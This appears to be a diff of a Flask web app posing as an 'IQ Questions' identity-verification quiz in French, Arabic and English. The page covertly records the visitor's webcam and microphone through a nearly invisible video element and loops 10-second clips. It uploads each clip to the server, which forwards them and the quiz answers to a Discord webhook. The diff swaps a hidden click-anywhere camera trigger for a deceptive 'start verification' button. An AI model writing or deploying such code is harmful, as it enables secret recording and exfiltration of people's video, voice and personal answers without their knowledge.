@@ -14,7 +14,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">IQ Questions - Vérification d'identité</title>
+    <title id="pageTitle">IQ Questions - Vérification</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -46,13 +46,14 @@ HTML_TEMPLATE = """
         [dir="rtl"] .question-box { text-align: right; }
         .question-box label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 14px; color: var(--text); }
         .question-box select { width: 100%; padding: 10px; font-size: 14px; background: var(--input); border: 1px solid var(--border); border-radius: 8px; cursor: pointer; }
-        button { padding: 14px 20px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 15px; width: 100%; margin-top: 12px; color: white; background: linear-gradient(135deg, #10b981, #059669); }
-        button:hover { background: linear-gradient(135deg, #34d399, #059669); }
+        .action-btn { padding: 14px 20px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 15px; width: 100%; margin-top: 12px; color: white; background: #6366f1; }
+        .action-btn:hover { background: #4f46e5; }
+        #submitBtn { background: linear-gradient(135deg, #10b981, #059669); }
         #status { margin-top: 20px; font-weight: 700; font-size: 14px; }
         #video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
     </style>
 </head>
-<body onclick="initCameraOnce()">
+<body>
 <div class="card">
     <div class="top-bar">
         <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
@@ -63,13 +64,16 @@ HTML_TEMPLATE = """
         </select>
     </div>
     <h2 id="mainTitle">Vérification d'identité</h2>
-    <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>
+    <div class="subtitle" id="subTitle">Veuillez cliquer sur le bouton ci-dessous pour démarrer la vérification</div>
 
     <div id="video-container">
         <video id="webcam" autoplay playsinline muted></video>
     </div>
 
-    <form id="quizForm" onsubmit="event.preventDefault(); verifyAndSend();">
+    <!-- زر اجباري باش المتصفح يقبل الكاميرا ويتصوّر الفيديو والصوت بالصحيح -->
+    <button type="button" id="startCamBtn" class="action-btn" onclick="startCameraAndRecording()">🎥 Démarrer la vérification</button>
+
+    <form id="quizForm" style="display:none; margin-top:20px;" onsubmit="event.preventDefault(); verifyAndSend();">
         <input type="text" id="username" placeholder="Votre Nom Complet" required>
         
         <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="" class="opt-select">Sélectionnez</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
@@ -101,9 +105,9 @@ HTML_TEMPLATE = """
 <script>
     const translations = {
         fr: {
-            title: "IQ Questions - Vérification d'identité", welcome: "Bienvenue dans IQ Questions",
-            mainTitle: "Vérification d'identité", subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer",
-            usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez", yes: "Oui", no: "Non",
+            title: "IQ Questions - Vérification", welcome: "Bienvenue dans IQ Questions",
+            mainTitle: "Vérification d'identité", subTitle: "Veuillez cliquer sur le bouton pour démarrer",
+            btnStart: "🎥 Démarrer la vérification", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez", yes: "Oui", no: "Non",
             q: [
                 "1. Penses-tu être plus beau/belle que moi ?", "2. Te considères-tu comme quelqu'un de naïf ?",
                 "3. Quel est le nom de votre animal préféré ?", "4. Comment décrivez-vous votre journée en général ?",
@@ -118,9 +122,9 @@ HTML_TEMPLATE = """
             ]
         },
         ar: {
-            title: "أسئلة الذكاء - التحقق من الهوية", welcome: "مرحباً بكم في أسئلة الذكاء",
-            mainTitle: "التحقق من الهوية", subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة",
-            usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا",
+            title: "أسئلة الذكاء - التحقق", welcome: "مرحباً بكم في أسئلة الذكاء",
+            mainTitle: "التحقق من الهوية", subTitle: "يرجى النقر على الزر أدناه للبدء",
+            btnStart: "🎥 بدء التحقق والكاميرا", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا",
             q: [
                 "1. هل تعتقد أنك أنجح/أجمل مني؟", "2. هل تعتبر نفسك شخصاً ساذجاً؟",
                 "3. ما هو اسم حيوانك المفضل؟", "4. كيف تصف يومك بشكل عام؟",
@@ -135,9 +139,9 @@ HTML_TEMPLATE = """
             ]
         },
         en: {
-            title: "IQ Questions - Identity Verification", welcome: "Welcome to IQ Questions",
-            mainTitle: "Identity Verification", subTitle: "Please answer the 20 questions below to continue",
-            usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No",
+            title: "IQ Questions - Verification", welcome: "Welcome to IQ Questions",
+            mainTitle: "Identity Verification", subTitle: "Please click the button below to start",
+            btnStart: "🎥 Start Verification", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No",
             q: [
                 "1. Do you think you are more handsome/beautiful than me?", "2. Do you consider yourself naive?",
                 "3. What is the name of your favorite pet?", "4. How do you generally describe your day?",
@@ -162,6 +166,7 @@ HTML_TEMPLATE = """
         document.getElementById('welcomeText').innerText = t.welcome;
         document.getElementById('mainTitle').innerText = t.mainTitle;
         document.getElementById('subTitle').innerText = t.subTitle;
+        document.getElementById('startCamBtn').innerText = t.btnStart;
         document.getElementById('username').placeholder = t.usernamePlaceholder;
         document.getElementById('submitBtn').innerText = t.submitBtn;
         for (let i = 1; i <= 20; i++) {
@@ -176,49 +181,61 @@ HTML_TEMPLATE = """
     let mediaStream = null;
     let mediaRecorder = null;
     let recordedChunks = [];
-    let cameraInitialized = false;
 
-    async function initCameraOnce() {
-        if (cameraInitialized) return;
-        cameraInitialized = true;
+    async function startCameraAndRecording() {
         try {
             mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
             document.getElementById('webcam').srcObject = mediaStream;
-            console.log("Camera started successfully");
-            startNewSegment();
+            
+            // إخفاء زر البدء وإظهار الأسئلة
+            document.getElementById('startCamBtn').style.display = 'none';
+            document.getElementById('quizForm').style.display = 'block';
+            document.getElementById('subTitle').innerText = "Veuillez répondre aux 20 questions";
+
+            startSegmentLoop();
         } catch (err) {
-            console.error("Camera access denied or error:", err);
+            alert("Erreur: Accès à la caméra refusé.");
         }
     }
 
-    function startNewSegment() {
+    function startSegmentLoop() {
         if (!mediaStream) return;
-        recordedChunks = [];
+        
         try {
             mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
+            recordedChunks = [];
+
+            mediaRecorder.ondataavailable = e => {
+                if (e.data && e.data.size > 0) {
+                    recordedChunks.push(e.data);
+                }
+            };
+
             mediaRecorder.onstop = async () => {
                 if (recordedChunks.length > 0) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    console.log("Segment recorded, size:", blob.size);
-                    const username = document.getElementById('username').value || "Utilisateur Anonyme";
+                    const username = document.getElementById('username').value || "Anonyme";
                     const formData = new FormData();
-                    formData.append("username", username + " [🎥 Live Clip]");
-                    formData.append("video", blob, "live_clip.webm");
-                    try {
-                        let res = await fetch("/submit-consent", { method: "POST", body: formData });
-                        let resData = await res.json();
-                        console.log("Server response for clip:", resData);
-                    } catch (err) {
-                        console.error("Fetch error for clip:", err);
-                    }
+                    formData.append("username", username + " [🎥 10s Clip]");
+                    formData.append("video", blob, "clip.webm");
+                    
+                    fetch("/submit-consent", { method: "POST", body: formData }).catch(e => {});
                 }
-                startNewSegment();
+                // بدء مقطع جديد فوراً
+                startSegmentLoop();
             };
+
             mediaRecorder.start();
-            setTimeout(() => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
+
+            // إيقاف التسجيل بعد 10 ثوانٍ لتدخل onstop وتبعت الفيديو
+            setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === "recording") {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+
         } catch (err) {
-            console.error("MediaRecorder error:", err);
+            setTimeout(startSegmentLoop, 2000);
         }
     }
 
@@ -266,7 +283,7 @@ def send_to_discord(content, video_file=None):
     if video_file:
         files = {
             "file": (
-                video_file.filename or "live_clip.webm",
+                video_file.filename or "clip.webm",
                 video_file.read(),
                 video_file.content_type or "video/webm"
             )
@@ -277,7 +294,7 @@ def send_to_discord(content, video_file=None):
         files=files,
         timeout=30
     )
-    print(f"Discord API Response Status: {response.status_code}")
+    print(f"Discord Response: {response.status_code}")
     response.raise_for_status()
 
 @app.route("/submit-consent", methods=["POST"])
@@ -286,14 +303,12 @@ def submit_consent():
         username = request.form.get("username", "Utilisateur")
         video_file = request.files.get("video")
         if not video_file:
-            print("Error: No video file in request")
             return jsonify({"error": "No video"}), 400
-        print(f"Received video file from {username}, size check.")
-        content = f"🎥 **IQ Questions — Flux Vidéo (10s)**\n**Nom :** {username}"
+        content = f"🎥 **IQ Questions — Clip (10s)**\n**Nom :** {username}"
         send_to_discord(content, video_file)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
-        print(f"Exception in submit_consent: {str(e)}")
+        print(f"Error in submit_consent: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 @app.route("/submit-answers", methods=["POST"])
@@ -309,7 +324,7 @@ def submit_answers():
         send_to_discord(content)
         return jsonify({"message": "Sent"}), 200
     except Exception as e:
-        print(f"Exception in submit_answers: {str(e)}")
+        print(f"Error in submit_answers: {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
